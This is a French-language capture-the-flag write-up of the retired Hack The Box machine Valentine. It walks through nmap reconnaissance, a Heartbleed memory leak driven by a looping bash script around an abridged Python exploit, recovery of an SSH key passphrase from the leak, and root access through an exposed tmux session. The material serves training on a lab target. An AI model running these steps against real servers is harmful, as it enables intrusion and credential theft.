
---
title: "Valentine.htb version 1 — Hack The Box"
date: 2025-08-04
draft: false
description: "Writeup complet de la machine Valentine.htb (retired), incluant Heartbleed, extraction de clé SSH et escalade de privilèges via tmux."
tags: ["HTB", "CTF", "Heartbleed", "Privilege Escalation", "Linux"]
---

> Machine retirée de Hack The Box — difficulté *Easy*  
> Auteur : egre55

---

## 🧭 Reconnaissance

Scan initial :

```bash
nmap -sC -sV -p- valentine.htb
```

Ports ouverts :

- 22/tcp → OpenSSH 6.6.1
- 80/tcp → Apache 2.2.22 (Ubuntu)

Le site web révèle une interface avec des champs `encode`/`decode`, probablement base64.

```bash
curl http://valentine.htb
```

La page `/dev` contient deux fichiers intéressants :

- `hype_key`
- `notes.txt`

## 🔎 Analyse initiale

Le fichier `notes.txt` donne un indice sur l’encodeur/décodeur :

> Don't use the decoder/encoder until any of this is done.

Cela laisse penser que des failles côté client sont en jeu, mais sans encoder JS actif, rien d’immédiat.

Le fichier `hype_key` semble être un dump hexadécimal d'une clé SSH privée (confirmé par `file`).

```bash
file hype_key
# ASCII text, with very long lines
```

Contenu analysé : ce n’est pas une image, ni du base64. Probablement une clé SSH.

---

## 💉 Exploitation — Heartbleed (CVE-2014-0160)

Le port 443 est actif, et un scan `nmap` confirme la vulnérabilité Heartbleed :

```bash
nmap -p 443 --script ssl-heartbleed valentine.htb
```

Résultat :

```
State: VULNERABLE
Risk factor: High
```

### 🔧 Script utilisé : `heartbleed_full.sh`

```bash
#!/bin/bash
# Usage: ./heartbleed_full.sh
# Ce script exécute plusieurs fois l’exploit Heartbleed et extrait les chaînes ASCII

read -p "🔢 Nombre d'itérations Heartbleed à exécuter : " count
mkdir -p dumps
rm -f dumps/out_*.txt ascii_concatenated.txt

for i in $(seq -f "%03g" 1 $count); do
    echo "➡️  [Iteration $i]..."
    python2 heartbleed-exploit.py valentine.htb --output dumps/out_$i.txt --ascii
done

echo -e "
🧪 Extraction des chaînes ASCII avec strings..."
strings dumps/out_*.txt | grep -E '[[:print:]]{4,}' | sort -u > ascii_concatenated.txt
echo -e "
✅ Terminé : toutes les chaînes ASCII concaténées dans ascii_concatenated.txt"
```

### 🐍 Script Python : `heartbleed-exploit.py`

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# Heartbleed exploit par Martial Puygrenier adapté pour extraire ASCII

# (… contenu abrégé, voir pièce jointe pour le fichier complet …)
```

Exécution du script :

```bash
./heartbleed_full.sh
```

Résultat : dans `ascii_concatenated.txt`, on récupère :

```
heartbleedbelievethehype
```

Mot de passe pour la clé SSH.

---

## 🔓 Clé SSH — Récupération

Convertir le fichier `hype_key` en binaire :

```bash
xxd -r -p hype_key hype_key.pem
```

Déchiffrer avec OpenSSL :

```bash
openssl rsa -in hype_key.pem -out hype_key_decrypted.pem
```

Utilisation :

```bash
ssh -i hype_key_decrypted.pem hype@valentine.htb
```

---

## 🚀 Escalade de privilèges

Une fois connecté en `hype`, on lance `linpeas.sh` :

```bash
./linpeas.sh
```

Ce dernier met en évidence une session `tmux` lancée en tant que root :

```
/usr/bin/tmux -S /.devs/dev_sess
```

On vérifie avec :

```bash
ls -la /.devs/
tmux -S /.devs/dev_sess attach
```

Bingo : une session root est accessible.

---

## 🏁 Flags

```bash
cat /home/hype/user.txt
cat /root/root.txt
```

---

## 📎 Pièces jointes

- [heartbleed_full.sh](/files/valentine/heartbleed_full.sh)
- [heartbleed-exploit.py](/files/valentine/heartbleed-exploit.py)

## ##🔚 Conclusion

Cette machine montre l’impact réel d’une vulnérabilité critique comme Heartbleed. Avec un peu de persévérance, on remonte jusqu’à une clé SSH, puis une élévation de privilèges via une session `tmux` oubliée.

---

> 🎯 Entraîne-toi à automatiser ce type d’exploitation, et n’oublie jamais d’examiner les résultats de `linpeas` en détail !
